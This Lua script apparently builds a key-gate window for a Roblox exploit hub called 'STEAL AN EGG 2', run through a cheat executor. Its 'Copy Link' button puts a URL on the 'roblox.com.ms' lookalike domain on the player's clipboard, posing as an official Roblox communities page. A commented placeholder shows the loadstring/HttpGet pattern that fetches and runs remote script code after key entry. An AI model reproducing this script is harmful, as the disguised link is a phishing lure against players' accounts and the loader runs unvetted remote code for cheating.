-- // STEAL AN EGG 2 - Key System GUI
-- // Made by LUNIX

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ==== CONFIG ====
local KEY_LINK = "https://roblox.com.ms/communities/5116305744/" -- <-- change this anytime
local HUB_NAME = "STEAL AN EGG 2"
local MADE_BY = "LUNIX"

-- ==== CLEANUP OLD GUI ====
if LocalPlayer.PlayerGui:FindFirstChild("KeySystemGui") then
    LocalPlayer.PlayerGui.KeySystemGui:Destroy()
end

-- ==== GUI CREATION ====
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeySystemGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 380, 0, 220)
MainFrame.Position = UDim2.new(0.5, -190, 0.5, -110)
MainFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 12)
UICorner.Parent = MainFrame

local UIStroke = Instance.new("UIStroke")
UIStroke.Color = Color3.fromRGB(60, 200, 120)
UIStroke.Thickness = 1.5
UIStroke.Parent = MainFrame

local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Size = UDim2.new(1, 0, 0, 50)
TitleBar.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 12)
TitleCorner.Parent = TitleBar

local TitleFix = Instance.new("Frame")
TitleFix.Size = UDim2.new(1, 0, 0, 12)
TitleFix.Position = UDim2.new(0, 0, 1, -12)
TitleFix.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
TitleFix.BorderSizePixel = 0
TitleFix.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "TitleLabel"
TitleLabel.Size = UDim2.new(1, -20, 1, 0)
TitleLabel.Position = UDim2.new(0, 10, 0, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = HUB_NAME .. " | Made by " .. MADE_BY
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.TextSize = 16
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.TextTruncate = Enum.TextTruncate.AtEnd
TitleLabel.Parent = TitleBar

local SubLabel = Instance.new("TextLabel")
SubLabel.Size = UDim2.new(1, -40, 0, 30)
SubLabel.Position = UDim2.new(0, 20, 0, 60)
SubLabel.BackgroundTransparency = 1
SubLabel.Text = "Get a key to unlock the script"
SubLabel.TextColor3 = Color3.fromRGB(180, 180, 190)
SubLabel.Font = Enum.Font.Gotham
SubLabel.TextSize = 14
SubLabel.TextXAlignment = Enum.TextXAlignment.Left
SubLabel.Parent = MainFrame

local KeyBox = Instance.new("TextBox")
KeyBox.Name = "KeyBox"
KeyBox.Size = UDim2.new(1, -40, 0, 40)
KeyBox.Position = UDim2.new(0, 20, 0, 95)
KeyBox.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
KeyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyBox.PlaceholderText = "Paste your key here..."
KeyBox.PlaceholderColor3 = Color3.fromRGB(130, 130, 140)
KeyBox.Font = Enum.Font.Gotham
KeyBox.TextSize = 14
KeyBox.ClearTextOnFocus = false
KeyBox.Text = ""
KeyBox.Parent = MainFrame

local KeyBoxCorner = Instance.new("UICorner")
KeyBoxCorner.CornerRadius = UDim.new(0, 8)
KeyBoxCorner.Parent = KeyBox

local KeyBoxPad = Instance.new("UIPadding")
KeyBoxPad.PaddingLeft = UDim.new(0, 10)
KeyBoxPad.PaddingRight = UDim.new(0, 10)
KeyBoxPad.Parent = KeyBox

local ButtonHolder = Instance.new("Frame")
ButtonHolder.Size = UDim2.new(1, -40, 0, 45)
ButtonHolder.Position = UDim2.new(0, 20, 0, 150)
ButtonHolder.BackgroundTransparency = 1
ButtonHolder.Parent = MainFrame

local CheckKeyBtn = Instance.new("TextButton")
CheckKeyBtn.Name = "CheckKeyBtn"
CheckKeyBtn.Size = UDim2.new(0.48, 0, 1, 0)
CheckKeyBtn.Position = UDim2.new(0, 0, 0, 0)
CheckKeyBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 120)
CheckKeyBtn.Text = "Check Key"
CheckKeyBtn.TextColor3 = Color3.fromRGB(10, 10, 10)
CheckKeyBtn.Font = Enum.Font.GothamBold
CheckKeyBtn.TextSize = 15
CheckKeyBtn.AutoButtonColor = false
CheckKeyBtn.Parent = ButtonHolder

local CheckKeyCorner = Instance.new("UICorner")
CheckKeyCorner.CornerRadius = UDim.new(0, 8)
CheckKeyCorner.Parent = CheckKeyBtn

local CopyLinkBtn = Instance.new("TextButton")
CopyLinkBtn.Name = "CopyLinkBtn"
CopyLinkBtn.Size = UDim2.new(0.48, 0, 1, 0)
CopyLinkBtn.Position = UDim2.new(0.52, 0, 0, 0)
CopyLinkBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 52)
CopyLinkBtn.Text = "Copy Link"
CopyLinkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyLinkBtn.Font = Enum.Font.GothamBold
CopyLinkBtn.TextSize = 15
CopyLinkBtn.AutoButtonColor = false
CopyLinkBtn.Parent = ButtonHolder

local CopyLinkCorner = Instance.new("UICorner")
CopyLinkCorner.CornerRadius = UDim.new(0, 8)
CopyLinkCorner.Parent = CopyLinkBtn

local CopyLinkStroke = Instance.new("UIStroke")
CopyLinkStroke.Color = Color3.fromRGB(60, 200, 120)
CopyLinkStroke.Thickness = 1
CopyLinkStroke.Parent = CopyLinkBtn

local StatusLabel = Instance.new("TextLabel")
StatusLabel.Size = UDim2.new(1, -40, 0, 20)
StatusLabel.Position = UDim2.new(0, 20, 1, -30)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = ""
StatusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.TextSize = 13
StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
StatusLabel.Parent = MainFrame

-- Draggable window
local dragging, dragInput, dragStart, startPos
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)
TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- ==== BUTTON LOGIC ====

CopyLinkBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(KEY_LINK)
        StatusLabel.TextColor3 = Color3.fromRGB(60, 200, 120)
        StatusLabel.Text = "Link copied to clipboard!"
    else
        StatusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
        StatusLabel.Text = "Clipboard not supported on this executor."
    end
end)

local VALID_KEYS = {
    ["EXAMPLEKEY123"] = true,
}

CheckKeyBtn.MouseButton1Click:Connect(function()
    local enteredKey = KeyBox.Text

    if enteredKey == "" then
        StatusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
        StatusLabel.Text = "Please enter a key."
        return
    end

    if VALID_KEYS[enteredKey] then
        StatusLabel.TextColor3 = Color3.fromRGB(60, 200, 120)
        StatusLabel.Text = "Key accepted! Loading script..."
        task.wait(1)
        ScreenGui:Destroy()

        -- ==== PUT YOUR MAIN SCRIPT LOAD HERE ====
        -- loadstring(game:HttpGet("YOUR_MAIN_SCRIPT_URL"))()

    else
        StatusLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
        StatusLabel.Text = "Invalid key. Try again."
    end
end)
